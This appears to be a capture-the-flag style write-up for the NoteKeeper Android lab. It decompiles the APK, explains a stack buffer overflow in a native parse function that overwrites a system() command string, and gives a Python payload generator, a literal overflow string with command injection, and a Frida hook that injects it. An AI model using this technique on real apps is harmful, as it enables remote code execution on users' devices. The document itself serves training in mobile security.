**Description**: Welcome to the **NoteKeeper** Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.

**Download**: https://lautarovculic.com/my_files/notekeeper.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-notekeeper

![[notekeeper.png]]

Install the app with **ADB**
```bash
adb install -r notekeeper.apk
```

We can see how this notes app allows us to **enter a title and description**.
In addition, once we *save the note*, it shows us a **character counter** (*of the description*).

Let's decompile the **apk** with **apktool**
```bash
apktool d notekeeper.apk
```
Also, let's inspect the **source code** with **jadx**.

We can see that this app call an **library**
```java
static {
    System.loadLibrary("notekeeper");
}
```
Let's see the code of some function.
We can see this function:
`Java_com_mobilehackinglab_notekeeper_MainActivity_parse`
With this content:
```C
Java_com_mobilehackinglab_notekeeper_MainActivity_parse
          (_JNIEnv *param_1,undefined8 param_2,_jstring *param_3)

{
  int local_2a8;
  char local_2a4 [100];
  char acStack_240 [500];
  int local_4c;
  ushort *local_48;
  _jstring *local_40;
  undefined8 local_38;
  _JNIEnv *local_30;
  undefined8 local_28;
  
  local_40 = param_3;
  local_38 = param_2;
  local_30 = param_1;
  local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0);
  local_4c = _JNIEnv::GetStringLength(local_30,local_40);
  memcpy(acStack_240,"Log \"Note added at $(date)\"",500);
  if (local_48 == (ushort *)0x0) {
    local_28 = 0;
  }
  else {
    local_2a4[0] = FUN_00100bf4(*local_48 & 0xff);
    for (local_2a8 = 1; local_2a8 < local_4c; local_2a8 = local_2a8 + 1) {
      local_2a4[local_2a8] = (char)local_48[local_2a8];
    }
    system(acStack_240);
    local_2a4[local_2a8] = '\0';
    local_28 = _JNIEnv::NewStringUTF(local_30,local_2a4);
  }
  return local_28;
}
```

Let's explain where the **buffer overflow** is.
- The overflow occurs in `local_2a4`, a **100-byte buffer**, when **data is copied** from `local_48` *without validating its size*.
- This allows **overwriting adjacent values on the stack**, including the `acStack_240` string, used in the **dangerous `system()` function**.

**How we can inject the malicious code?**
- We injected a **malicious payload that overflowed `local_2a4`** and **modified the contents** of `acStack_240`.
- We **exploited the call** to `system(acStack_240)` to execute **arbitrary commands** (`id`) on the system.

**Why this can work?**
- There was no **boundary validation in the loop that copies data** to `local_2a4`.
- The `system()` command *directly executes* what is in `acStack_240`.

But, **where we inject the payload?**
According to **`MainActivity.java`** class, we can see that the **parse** function of the **library** is used in the **title**
```java
String cap_title = this$0.parse(title_);
```
And
```java
public final native String parse(String Title);
```
- The title (`title_`) is **passed directly to the native parse method**, where the buffer overflow occurs.
- The description (`note_con`) is **not passed to the native method**, but is used only to display content in the interface.

So, the *char counter* doesn't matter clearly.
- The **native parse method works with `param_3`**, which **directly receives the title** as a String.
- In the C code, the **title is converted to a pointer (`local_48`)** and copied into the vulnerable buffer `local_2a4`.
```C
local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0);
```

So let's use this python script:
```python
# buffer local_2a4 (100 bytes)
payload = "A" * 100
# Padding
payload += "BBBB" * 5
# command to execute 'system(acStack_240)'
payload += "; id > /data/data/com.mobilehackinglab.notekeeper/test.txt"

with open("payload.txt", "w") as f:
    f.write(payload)

print("[+] Payload generated:")
print(payload)
print("[+] Saved as 'payload.txt'")
```
Then, copy the payload:
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB; id > /data/data/com.mobilehackinglab.notekeeper/outputCommand.txt
```
And check the content with **ADB**
```bash
cat /data/data/com.mobilehackinglab.notekeeper/outputCommand.txt
```

Also you can try make it **intercepting** with **frida** the **title**, then **replace it with the payload**.
```javascript
Java.perform(function () {
    var MainActivity = Java.use('com.mobilehackinglab.notekeeper.MainActivity');

    // Hooking
    var parse = MainActivity.parse.overload('java.lang.String');
    parse.implementation = function (title) {
        console.log("[+] Intercepting parse...");
        console.log("[+] Original Title: " + title);

        // Craft payload
        var payload = "A".repeat(100); // Overflow buffer
        payload += "BBBB"; // Padding
        payload += "; id > /data/data/com.mobilehackinglab.notekeeper/fridaInection.txt";

        console.log("[+] Injected payload: " + payload);

        // Call to the function
        return parse.call(this, payload);
    };
});
```

![[notekeeper2.png]]

I hope you found it useful (: